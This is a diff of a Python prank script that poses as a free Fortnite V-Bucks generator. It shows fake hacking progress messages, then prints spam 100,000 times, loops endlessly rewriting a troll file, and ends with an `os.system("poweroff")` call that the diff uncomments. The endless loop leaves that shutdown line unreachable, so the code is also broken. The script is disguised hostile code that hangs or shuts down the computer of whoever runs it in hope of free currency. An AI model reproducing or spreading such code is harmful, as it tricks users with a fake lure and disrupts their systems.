@@ -4,16 +4,19 @@
 # Discord: Celvis#1772
 # Original = https://github.com/stayfrostydoggo/Funny-Stuff-IG/blob/main/freevbucks.py
 # Author = starfrostydoggo (Aka Bored)
+
+
+ALMOST DONE. NOT DONE YET.
 """
 
 # Import Modules
-import time
-import os
 import itertools
 import threading
+import time
 import sys
+import os
 
-# Set vbux to 0
+# Set bux to 0
 vbux = 0
 
 # Wanted
@@ -22,79 +25,94 @@ vbux += wanted
 
 # Fake load
 # Load 1
-load1 = False
-def loader1():
-    for c in itertools.cycle(['.', '..', '...','   ']):
-        if load1:
+done1 = False
+def load1():
+    for c in itertools.cycle(['.', '..', '...', '   ']):
+        if done1:
             break
-        sys.stdout.write("Loading vbucks" + c)
+        sys.stdout.write("\rLoading vbux" + c)
         sys.stdout.flush()
-        time.sleep(3)
-    t = threading.Thread(target=loader1)
-    t.start()
-# Process 1
-load1 = True
+        time.sleep(0.2)
+t = threading.Thread(target=load1)
+t.start()
+time.sleep(3)
+print("\n")
+done1 = True
 
 # Load 2
-load2 = False
-def loader2():
-    for c in itertools.cycle(['.', '..', '...','   ']):
-        if load2:
+done2 = False
+def load2():
+    for c in itertools.cycle(['.', '..', '...', '   ']):
+        if done2:
             break
-        sys.stdout.write("Breaching Fortnite mainframe" + c)
+        sys.stdout.write("\rBreaching Fortnite mainframe" + c)
         sys.stdout.flush()
-        time.sleep(5)
-    t = threading.Thread(target=loader2)
-    t.start()
-# Process 2
-load2 = True
+        time.sleep(0.2)
+t = threading.Thread(target=load2)
+t.start()
+time.sleep(5)
+print("\n")
+done2 = True
 
 # Load 3
-load3 = False
-def loader3():
-    for c in itertools.cycle(['.', '..', '...','   ']):
-        if load3:
+done3 = False
+def load3():
+    for c in itertools.cycle(['.', '..', '...', '   ']):
+        if done3:
             break
-        sys.stdout.write("Bruteforcing vbux database" + c)
+        sys.stdout.write("\rBruteforcing vbux database" + c)
         sys.stdout.flush()
-        time.sleep(4)
-    t = threading.Thread(target=loader3)
-    t.start()
-# Process 3
-load3 = True
+        time.sleep(0.2)
+t = threading.Thread(target=load3)
+t.start()
+time.sleep(4)
+print("\n")
+done3 = True
 
 # Load 4
-load4 = False
-def loader4():
-    for c in itertools.cycle(['.', '..', '...','   ']):
-        if load4:
+done4 = False
+def load4():
+    for c in itertools.cycle(['.', '..', '...', '   ']):
+        if done4:
             break
-        sys.stdout.write("Siphoning vbux" + c)
+        sys.stdout.write("\rSiphoning vbux" + c)
         sys.stdout.flush()
-        time.sleep(3)
-    t = threading.Thread(target=loader4)
-    t.start()
-# Process 4
-load4 = True
+        time.sleep(0.2)
+t = threading.Thread(target=load4)
+t.start()
+time.sleep(3)
+print("\n")
+done4 = True
 
-# Load 5
-#print("Generating hash key for vbux...")
-#time.sleep(3)
+# Load5
+done5 = False
+def load5():
+    for c in itertools.cycle(['.', '..', '...', '   ']):
+        if done5:
+            break
+        sys.stdout.write("\rGenerating hash key for vbux" + c)
+        sys.stdout.flush()
+        time.sleep(0.2)
+t = threading.Thread(target=load5)
+t.start()
+time.sleep(3)
+print("\n")
+done5 = True
 
-
-
-
-
-print("VBUS HAK COMPLETE!!1111!!1!")
-
+print("\nVBUS HAK COMPLETE!!1111!!1!")
 print(f"you have {vbux} vbucks")
 x = 0
 time.sleep(2)
 
+while x < 100000:
+        print("OMG I LOVE FREE VBUX")
+        x += 1
 
-#while x < 100000:
-print("OMG I LOVE FREE VBUX")
-#        x += 1
+# Creates a bunch of troll files
+files = True
+while files:
+    f = open("vbux", "w")
+    f.write("vbux vbux vbux vbux vbux vbux vbux vbux vbux vbux\nGet trolled :)\n\n\n\nCelvis#1772, stayfrostybro (Aka Bored)\nhttps://github.com/Celvis-wq/freevbucksTroll")
+    f.close()
 
-
-#os.system("poweroff")
+os.system("poweroff")
